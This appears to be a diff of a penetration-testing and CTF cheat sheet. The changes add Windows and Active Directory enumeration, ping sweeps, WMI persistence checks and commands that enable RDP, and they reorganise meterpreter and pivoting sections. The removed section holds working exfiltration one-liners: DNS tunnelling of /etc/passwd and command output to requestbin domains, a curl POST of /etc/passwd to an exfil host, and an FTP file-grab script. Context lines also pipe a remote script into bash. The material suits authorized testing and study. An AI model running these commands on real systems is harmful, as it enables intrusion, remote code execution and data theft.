@@ -27,6 +27,37 @@ nmap -vv -n -sT 10.10.10.0/24
 nmap -vv -n -Pn -sT 10.10.10.0/24
 ```
 
+### Subnet Sweeps
+
+Nmap subnet scan with ping sweep:
+
+```sh
+nmap -vv -n -sT 10.10.10.0/24
+```
+
+Linux native ping sweep (runs in parallel):
+
+```sh
+export SUBNET=192.168.33
+for i in {1..254}; do (ping $SUBNET.$i -c 1 -w 5  >/dev/null && echo "$SUBNET.$i is up" &); done
+```
+
+Windows native ping sweeps:
+
+```bat
+:: Option 1: Ping sequentially and record hits.
+FOR /L %i IN (1,1,254) DO ping -n 1 192.168.10.%i | FIND /i "Reply">>up-hosts.txt
+
+:: Option 2: Ping broadcast address and look for new arp cache entries after a few
+::           seconds.
+for /L %a in (1,1,254) do start ping 192.168.0.%a
+arp -a
+
+:: Option 3: PowerShell version of Option 2.
+powershell -ExecutionPolicy Bypass -c "0..255 | ForEach-Object {ping 192.168.1.$_}"
+arp -a
+```
+
 ### HTTP Enumeration
 
 #### Directory Scanning
@@ -99,114 +130,9 @@ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | ba
 
 A lot of information can be gleaned by watching changes to [procfs](https://en.wikipedia.org/wiki/Procfs). An amazing tool for automating this is [`pspy`](https://github.com/DominicBreuker/pspy).
 
-## File Exfiltration
+## Meterpreter Snippets
 
-### DNS Exfiltration
-
-When outbound rules from a target are restrictive, it may still be possible to exfiltrate data via DNS. The awesome site [requestbin.net](requestbin.net) has support for [receiving DNS queries](http://requestbin.net/dns), too. By encoding the data-to-exfil within the subdomain field of a domain we control (through a service like requestbin), we can send pretty much data back to ourselves. requestbin alternatives include:
-
-* [DNSBin](http://dnsbin.zhack.ca)
-
-These concepts are based on [this writeup from Insomnihack Teaser 2020](https://ctftime.org/writeup/17998). I present below a proof-of-concept DNS exfiltration protocol with the following fields:
-
-* N-byte 0-indexed sequence number
-* 2-byte session
-* N-byte data field
-* The remainer of the requestbin domain (something like `.bf6c4b6d8f1b164d5c4d.d.requestbin.net`)
-
-Some restrictions are inherited from the DNS specification:
-
-* Each label (i.e., `www` and `company` from `www.company.com`) cannot exceed 63 characters
-* The total length of the domain cannot exceed 253 characters
-
-The below one-liners provide mechanisms of generating a `/tmp/resolveme` file that encodes the desired payload into a series of domains that use this basic protocol. The only step that remains after generating this file is to execute the DNS queries that create the exfiltration traffic. Take note that these one-liners also generate the session bytes inline; if space is at a premium, you can do this offline and harcode it in the commands. Another implementation of the below snippets is that they provide a 5-character space for the sequence number; exfils involving larger sequences may have to adjust this logic.
-
-```sh
-# Python 2/3 file read with compression; use `./python3-dns-bin-retriever -d zlib -t TOKEN` to retrieve from dnsbin.
-python -c "s='.%02x'%__import__('random').getrandbits(8);d='.8f85be7ebfc30f73ebe5.d.requestbin.net';open('/tmp/resolveme','w').write('\n'.join(str(i)+s+'.'+x+d for i,x in enumerate(__import__('textwrap').fill(__import__('binascii').hexlify(__import__('zlib').compress(open('/etc/passwd','rb').read())).decode(),min(63,245-len(s)-len(d))).splitlines())))"
-
-# python 2/3 command exec with compression; use `./python3-dns-bin-retriever -d zlib -t TOKEN` to retrieve from dnsbin.
-python3 -c "s='.%02x'%__import__('random').getrandbits(8);d='.e004d291fe96f8880232.d.requestbin.net';open('/tmp/resolveme','w').write('\n'.join(str(i)+s+'.'+x+d for i,x in enumerate(__import__('textwrap').fill(__import__('binascii').hexlify(__import__('zlib').compress(__import__('subprocess').check_output('ls -la 2>&1',shell=True))).decode(),min(63,245-len(s)-len(d))).splitlines())))"
-
-# Bash file read with compression; use `./python3-dns-bin-retriever -d gzip -t TOKEN` to retrieve from dnsbin.
-rm /tmp/resolveme; d='.17ccedcf3f3294a6cbcc.d.requestbin.net';i=0;sess=$(xxd -l 1 -p /dev/urandom); <data.txt gzip -c | xxd -c 31 -p | while read l; do echo $i.$sess.$l$d >> /tmp/resolveme; let i++; done
-```
-
-And then sending that data from the target to your dnsbin listener:
-
-```sh
-# dig-powered name resolution.
-dig -f /tmp/resolveme
-
-# nslookup-powered name resolution
-while read d; do nslookup $d; done </tmp/resolveme
-```
-
-While data can be manually retrieved and decoded/decompressed from requestbin, it might be useful to setup an automated retriever. See my [dnsbin retriever](../scripts/exfil/python3-dnsbin-retriever.py) script for a ready-to-go solution.
-
-### HTTP File Exfiltration
-
-A convenient method of transferring back to yourself is through HTTP POSTs using an existing HTTP client like `curl`. This can also be paired with a service like [ngrok](https://ngrok.com/) if you just want to transfer files over the public internet.
-
-#### Server-side
-
-Using PHP's `-S` standalone server mode, it is pretty simple to accept client file-upload requests. More information about the PHP builtin web server available [here](https://www.php.net/manual/en/features.commandline.webserver.php). You can grab a copy of my POSTed-file-accepting PHP server in the [`scripts/web`](../scripts/web) directory.
-
-#### Client-side
-
-The simplest way of uploading files from the client side is to POST them with `curl`:
-
-```sh
-curl -vv -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -F 'f=@/etc/passwd' http://exfil-server.com:8888
-```
-
-#### Tunnelling Over the Public Internet
-
-Sometimes you can't communicate directly back to your attack machine from the target, but the target *can* touch the public internet. The following services will come in handy for quickly setting up listeners on the public internet:
-
-* [ngrok](https://ngrok.com/): Free service that lets you expose HTTP and TCP ports on your machine on an `*.ngrok.io` domain on the public web. Probably the best option in this list.
-* [requestbin](http://requestbin.net/): Free service for receiving HTTP requests. More useful for SSRF or XSS challenges where you do not need to control the application server talking back to the target. This site also provides [dnsbin](http://requestbin.net/dns).
-
-### SMB File Exfiltration
-
-Host files from a Kali workstation with:
-
-```sh
-mkdir smb-files
-impacket-smbserver -smb2support MySmbTransferShare ./smb-files
-```
-
-### FTP File Exfiltration
-
-If you can reach a target that has an FTP server, you probably want those files. In the event you are trying to exfil from a host that does not have a native FTP client, but has Python, the following script provides a solution:
-
-```python
-import sys
-from ftplib import FTP
-
-HOST = "10.10.10.10"
-USER, PASS = "anonymous", "anonymous@"
-
-FILES_TO_EXFIL = [
-    "secret-data.txt",
-    "another-script.py",
-]
-
-ftp = FTP(HOST)
-ftp.login(USER, PASS)
-ftp.retrlines("LIST")
-
-for f in FILES_TO_EXFIL:
-    sys.stdout.write(ftp.retrbinary("RETR " + f, open(f, "wb").write) + "\n")
-
-ftp.quit()
-```
-
-You might want to turn this script into a one-line shell command. If so, check out [my one-liner-izing script](../scripts/encoding/any-python-one-liner-ize.py).
-
-## Internal Network Enumeration
-
-### Meterpreter Payload Generation
+### Payload Generation
 
 Here are some snippets for generating common meterpreter payloads:
 
@@ -245,7 +171,7 @@ When ready, set up a meterpreter listener/connector using something like the fol
 handler -H 10.10.10.10 -P 443 -p windows/x64/meterpreter/bind_tcp
 ```
 
-### Routing through Sessions
+### Routing Through Sessions
 
 If you have a meterpreter session on a jump point in the network, you can have tools implicitly route their traffic through that point by adding a routing rule in metasploit:
 
@@ -291,16 +217,7 @@ set payload PSH (Binary)
 run
 ```
 
-### Ping Subnet Scanning
-
-If you don't care about being too loud, this `ping` snippet is a quick-and-dirty way of detecting adjacent hosts on your subnet:
-
-```sh
-export SUBNET=192.168.33
-for i in {1..254}; do (ping $SUBNET.$i -c 1 -w 5  >/dev/null && echo "$SUBNET.$i" &); done
-```
-
-## Windows Pivoting/Tooling
+## Windows Local Enumeration and Pivoting
 
 ### File System Enumeration
 
@@ -317,6 +234,72 @@ And from a native `cmd.exe` shell (as explained [here](https://stackoverflow.com
 
 ```bat
 findstr /spin /c:"needle" [files]
+```
+
+Listing files in typical locations of interest:
+
+```powershell
+(Get-ChildItem -Recurse -Path \Windows\Temp).fullname
+(Get-ChildItem -Recurse -Path \Users\*\Desktop).fullname
+(Get-ChildItem -Recurse -Path \Users\*\Documents).fullname
+
+# Example that excludes folders:
+(Get-ChildItem -Recurse -Path \Windows\Temp).fullname | Where-Object { !$_PSIsContainer }
+```
+
+### Active Directory Enumeration
+
+Some nice overview resources include:
+
+* [The DFIR Report - From Zero to Domain Admin](https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/)
+
+#### Inititial Reconnaissance
+
+```bat
+:: Get more information about your user and other domain users.
+whoami /priv
+net user USERNAME /domain
+net users /domain
+net localgroup Administrators
+net group Administrators /domain
+```
+
+Getting a lay of the land with PowerShell:
+
+```powershell
+# Get AD users.
+Get-ADUser -Filter * | select UserPrincipalName
+
+# Get AD administrators.
+Get-ADGroupMember -Identity "Domain Admins" -Recursive | select name
+Get-ADGroupMember -Identity "Enterprise Admins" -Recursive | select name
+
+# Get hosts on the domain.
+Get-ADComputer -Filter * | select DNSHostName
+
+# Enumerate SMB shares.
+Get-SmbShare
+```
+
+### Scheduled Task Enumeration
+
+```powershell
+# Look at all scheduled tasks at high level.
+Get-ScheduledTask | format-table TaskName, TaskPath, Description
+
+# Look at arguments / commands associated with tasks.
+(Get-ScheduledTask).Actions
+(Get-ScheduledTask | where TaskName -EQ 'test').Actions
+```
+
+### Service Enumeration
+
+```powershell
+# Enumerate all services with their program name and arguments displayed.
+get-wmiobject win32_service | format-list Name, Description, PathName
+
+# Look at a specific service.
+get-wmiobject win32_service | where-object {$_.Name -eq 'Schedule'} | format-list Name, Description, PathName
 ```
 
 ### Interacting with Native Protocols
@@ -476,6 +459,19 @@ impacket-wmiexec MyDomain/MyUsername:MyPassword@10.10.10.10
 
 See [Hunting for Impacket](https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/) for a blue team perspective on identifying the use of these tools.
 
+Enumerate WMI persistence (see [here](https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96)):
+
+```powershell
+# Assuming we are looking for an event filter with 'needle' in the name (omit
+# -Filter to see all entities):
+Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='needle'"
+Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer "Name='needle'"
+Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding "__Path LIKE '%needle%'"
+
+# To remove the entities associated with that filter, we can append the following to the above commands:
+| Remove-WmiObject -Verbose
+```
+
 #### DCOM
 
 Useful resources:
@@ -501,6 +497,22 @@ This process can also be performed from a Linux workstation via [`dcomexec.py`](
 impacket-dcomexec -object MMC20 MyDomain/MyUser:MyPassword@10.10.10.10
 ```
 
+#### RDP
+
+Enable RDP:
+
+```powershell
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+Test-NetConnection 10.10.10.10 -CommonTCPPort rdp
+```
+
+Add specific users to have RDP permission:
+
+```bat
+net localgroup "Remote Desktop Users" DOMAIN\USER /add
+```
+
 #### Other Useful Impacket Scripts
 
 The following Impacket scripts also provide useful remote query capabilities (some example use can be found [here](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)):
@@ -514,19 +526,13 @@ The following Impacket scripts also provide useful remote query capabilities (so
 * [`smbrelayx.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbrelayx.py)
 * [`services.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/services.py)
 
-### Passing the Hash
-
-[This Cobalt Strike blog post](https://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-hash-with-mimikatz/) talks through a use case to pass the hash to gain a different token for a local process, which can then be used to interact with different remote systems under the context of a different user.
+### Kerberos
 
 TODO
 
-### Active Directory
+### Passing the Hash
 
-Some nice overview resources include:
-
-* [The DFIR Report - From Zero to Domain Admin](https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/)
-
-#### Kerberos
+[This Cobalt Strike blog post](https://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-hash-with-mimikatz/) talks through a use case to pass the hash to gain a different token for a local process, which can then be used to interact with different remote systems under the context of a different user.
 
 TODO
 
@@ -537,6 +543,8 @@ TODO
 ### File System Enumeration
 
 TODO
+
+### C2 Frameworks
 
 ### PowerShell Empire
 
@@ -604,7 +612,7 @@ TODO
 
 POC is available [here](https://github.com/bb00/zer0dump).
 
-## Linux Pivoting/Tooling
+## Linux Local Enumeration and Pivoting
 
 ### File System Enumeration
 
